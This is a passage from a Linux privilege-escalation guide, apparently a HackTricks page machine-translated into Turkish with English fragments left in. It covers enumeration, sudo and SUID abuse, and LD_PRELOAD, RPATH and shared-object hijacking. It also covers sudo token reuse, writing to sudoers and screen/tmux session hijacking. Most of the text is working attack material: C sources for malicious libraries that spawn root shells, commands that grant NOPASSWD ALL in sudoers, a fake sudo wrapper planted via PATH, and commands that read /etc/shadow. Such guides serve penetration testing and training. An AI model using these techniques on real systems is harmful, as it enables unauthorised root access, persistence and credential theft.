D-Bus is a sophisticated **inter-Process Communication (IPC) system** that enables applications to efficiently interact and share data. Designed with the modern Linux system in mind, it offers a robust framework for different forms of application communication.

The system is versatile, supporting basic IPC that enhances data exchange between processes, reminiscent of **enhanced UNIX domain sockets**. Moreover, it aids in broadcasting events or signals, fostering seamless integration among system components. For instance, a signal from a Bluetooth daemon about an incoming call can prompt a music player to mute, enhancing user experience. Additionally, D-Bus supports a remote object system, simplifying service requests and method invocations between applications, streamlining processes that were traditionally complex.

D-Bus operates on an **allow/deny model**, managing message permissions (method calls, signal emissions, etc.) based on the cumulative effect of matching policy rules. These policies specify interactions with the bus, potentially allowing for privilege escalation through the exploitation of these permissions.

An example of such a policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` is provided, detailing permissions for the root user to own, send to, and receive messages from `fi.w1.wpa_supplicant1`.

Policies without a specified user or group apply universally, while "default" context policies apply to all not covered by other specific policies.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini buradan nasıl enumerate ve exploit edeceğinizi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Network'i enumerate etmek ve makinenin konumunu tespit etmek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişim sağlamadan önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sniff traffic yapıp yapamayacağınızı kontrol edin. Eğer yapabiliyorsanız, bazı credentials elde edebilirsiniz.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Kendinizin **who** olduğunu, hangi **privileges**'a sahip olduğunuzu, sistemde hangi **users**'in bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'a sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların escalate privileges yapmasına izin veren bir hatadan etkilendi. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Sizi root privileges verebilecek bir grubun **üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Eğer mümkünse panonun içinde ilginç bir şey olup olmadığını kontrol edin
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir **parolasını biliyorsanız**, parolayı kullanarak **her kullanıcıyla giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmaktan çekinmiyorsanız ve `su` ve `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcı üzerinde brute-force denemeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile aynı zamanda kullanıcılar üzerinde brute-force denemeye çalışır.

## Yazılabilir PATH suistimalleri

### $PATH

Eğer $PATH içindeki herhangi bir klasöre **yazabiliyorsanız**, yazılabilir klasörün içine farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla bir **backdoor** oluşturarak ayrıcalıkları yükseltebilirsiniz ve bu komut $PATH'te yazılabilir klasörünüzden **önce gelen bir klasörden yüklenmemelidir**.

### SUDO ve SUID

sudo kullanarak bazı komutları çalıştırmaya izinli olabilirsiniz veya dosyalarda suid biti olabilir. Kontrol etmek için:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumaya ve/veya yazmaya ya da hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla bir komutu parola bilmeden çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; root dizinine bir ssh anahtarı ekleyerek veya `sh` çağırarak artık bir shell almak çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge kullanıcının bir şey çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayalı**, script root olarak çalıştırılırken rastgele bir python kütüphanesi yüklemek için **PYTHONPATH hijacking**'e karşı **savunmasızdı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Neden işe yarar: Etkileşimsiz shell'ler için Bash, `$BASH_ENV`'i değerlendirir ve hedef script çalıştırılmadan önce o dosyayı source eder. Birçok sudo kuralı bir scripti veya bir shell wrapper'ı çalıştırmaya izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla kaynaklanır.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (`/bin/bash`'ı etkileşimsiz olarak çağıran herhangi bir hedef veya herhangi bir bash scripti).
- `BASH_ENV`'in `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `BASH_ENV` (ve `ENV`) öğelerini `env_keep`'ten kaldırın, `env_reset`'i tercih edin.
- sudo ile izin verilen komutlar için shell wrapper'larından kaçının; mümkünse minimal ikili (binaries) kullanın.
- Korunan env değişkenleri kullanıldığında sudo I/O kaydı ve uyarı mekanizmalarını düşünün.

### Sudo yürütme atlatma yolları

**Atlayın** diğer dosyaları okumak için veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu belirtilmemişse

Eğer **sudo izni** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary başka bir komutu yolunu belirtmeden çalıştırıyorsa da kullanılabilir (her zaman garip bir SUID binary'nin içeriğini _**strings**_ ile kontrol edin).

[Payload examples to execute.](payloads-to-execute.md)

### Komut yoluna sahip SUID binary

Eğer **suid** binary **başka bir komutu yolunu belirterek çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı isimde bir fonksiyon oluşturup **export a function** yapmayı deneyebilirsiniz.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydet: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Daha sonra **compile it** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ini kontrol ederse kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağan dışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, doğru şekilde **.so** dosyalarını yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak potansiyel bir istismar olanağına işaret eder.

Bunu istismar etmek için, örneğin _"/path/to/.config/libcalc.c"_ adında bir C dosyası oluşturulur; dosya aşağıdaki kodu içer:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldığında, dosya izinlerini değiştirerek ve ayrıcalıklı bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'nin çalıştırılması exploit'i tetiklemeli ve potansiyel sistem ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazma iznimizin olduğu bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, o klasöre gerekli isimle kütüphaneyi oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) yerel güvenlik kısıtlamalarını aşmak için bir saldırgan tarafından istismar edilebilecek Unix ikili dosyalarının özenle hazırlanmış bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynı şeyi yapar ancak bir komutta **yalnızca argüman enjekte edebildiğiniz** durumlar içindir.

Proje, kısıtlı shell'lerden kaçma, ayrıcalıkları yükseltme veya sürdürme, dosya transferi, bind ve reverse shell oluşturma ve diğer post-exploitation görevlerini kolaylaştırma amaçlı olarak kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl istismar edebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Tokenlarının Yeniden Kullanımı

Parolası olmadan **sudo access**'e sahip olduğunuz durumlarda, bir sudo komutu çalıştırılmasını bekleyip ardından oturum token'ını ele geçirerek ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten _sampleuser_ kullanıcısı olarak bir shell'e sahipsiniz
- _sampleuser_ son **15 dakika** içinde bir şey çalıştırmak için **`sudo` kullanmış olmalıdır** (varsayılan olarak bu, `sudo`'yu herhangi bir şifre girmeden kullanmamızı sağlayan sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u aktifleştirmek için `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` komutunu kullanabilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Eğer tüm bu gereksinimler karşılanmışsa, **aşağıdakini kullanarak ayrıcalıkları yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- İlk **exploit** (`exploit.sh`) _/tmp_ dizininde `activate_sudo_token` ikili dosyasını oluşturacaktır. Bunu oturumunuzdaki sudo token'ını etkinleştirmek için kullanabilirsiniz (otomatik olarak root shell elde etmeyeceksiniz; `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- İkinci **exploit** (`exploit_v2.sh`) _/tmp_ içinde **root'a ait ve setuid'li** bir sh shell oluşturacaktır
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Üçüncü exploit** (`exploit_v3.sh`) **sudoers file oluşturacak** ve **sudo tokens'i süresiz kılar ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **yazma izniniz** varsa, [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ikilisini kullanarak bir kullanıcı ve PID için **sudo token oluşturabilirsiniz**.\

Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan aşağıdakini yaparak **sudo ayrıcalıkları elde edebilirsiniz**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. Bu dosyalar **varsayılan olarak sadece root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgileri **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **yetki yükseltme** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` binary'sine bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf`'ta kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp `sudo` kullanarak** ayrıcalık yükselttiğini biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kodunuzu çalıştıracak ve ardından kullanıcının komutunu yürütecek yeni bir sudo yürütülebilir dosyası **oluşturabilirsiniz**. Sonra, kullanıcı bağlamının **$PATH**'ini değiştirin (örneğin yeni yolu `.bash_profile` içine ekleyerek) böylece kullanıcı sudo çalıştırdığında sizin sudo yürütülebilir dosyanız çalıştırılır.

Dikkat edin: kullanıcı farklı bir shell (bash değil) kullanıyorsa, yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen yapılandırma dosyalarının nereden alındığını belirtir**. Genellikle bu dosya şu satırı içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin aranacağı** diğer klasörleri **işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tür. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Eğer herhangi bir nedenle **bir kullanıcının yazma izinleri** aşağıdaki yollardan herhangi birinde varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasörde, yetki yükseltmesi yapabilmesi mümkün olabilir.\
Bu yapılandırma hatasının **nasıl istismar edileceğine** aşağıdaki sayfadan bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalayarak, `RPATH` değişkeninde belirtildiği üzere program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece mevcut root **ayrıcalıklarının bir alt kümesini sağlar**. Bu, root ayrıcalıklarını etkili bir şekilde **daha küçük ve ayırt edici birimlere böler**. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu sayede tam ayrıcalık seti azaltılır ve exploitation riskleri düşer.\
Aşağıdaki sayfayı okuyarak **capabilities hakkında ve bunların nasıl kötüye kullanılabileceği hakkında daha fazla bilgi edinin**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının "**cd**" ile klasöre girebileceği anlamına gelir.\
**"read"** biti kullanıcının **dosyaları** **listeleyebileceğini**, ve **"write"** biti kullanıcının yeni **dosyaları** **silip** ve **oluşturabileceğini** ifade eder.

## ACLs

Erişim Kontrol Listeleri (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilecek** yetenektedir. Bu izinler, sahip olmayan veya grubun bir parçası olmayan belirli kullanıcılara hak tanıyarak veya reddederek dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu düzeydeki **granülerlik daha hassas erişim yönetimini sağlar**. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakın.

**Verin** kullanıcı "kali"ya bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Sistemde belirli ACLs içeren dosyaları alın:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**eski sürümlerde** başka bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**en yeni sürümlerde** yalnızca **kendi kullanıcı hesabınızın** **screen** oturumlarına **connect** edebileceksiniz. Ancak **session içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux oturumlarının ele geçirilmesi

Bu, **old tmux versions** ile ilgili bir sorundu. Root tarafından oluşturulan tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **Valentine box from HTB**'e bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006 Eylül ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.  
Bu hata, söz konusu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şurada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Password authentication'ın izin verilip verilmediğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key authentication'ın izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Password authentication izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

Root'un ssh ile giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key kullanarak giriş yapabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: root sadece private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no`: girişe izin vermez

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bunlar home dizini ile değiştirilecektir. **Mutlak yollar ( `/` ile başlayan) belirtebilirsiniz** veya **kullanıcının home dizininden göreli yollar**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer "**testusername**" kullanıcısının **private** key'i ile giriş yapmaya çalışırsanız ssh'in sizin anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindeki anahtarlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) key bırakmak yerine **use your local SSH keys instead of leaving keys** yapmanızı sağlar. Böylece ssh ile bir **host**'a **jump** yapabilir ve oradan başka bir **host**'a **jump to another** yaparken **using** the **key** located in your **initial host** kullanabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya reddedebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesiyle ssh-agent forwarding'e **izin verebilir** veya **engelleyebilir** (varsayılan: izin verilir).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell açtığında **çalıştırılan betiklerdir**. Bu nedenle, bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer garip bir profil betiği bulunursa, **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Files

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor olabilir veya bir yedeği bulunabilir. Bu nedenle **bunların hepsini bulun** ve **okuyup okuyamayacağınızı kontrol edin**, dosyaların içinde **hashes** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
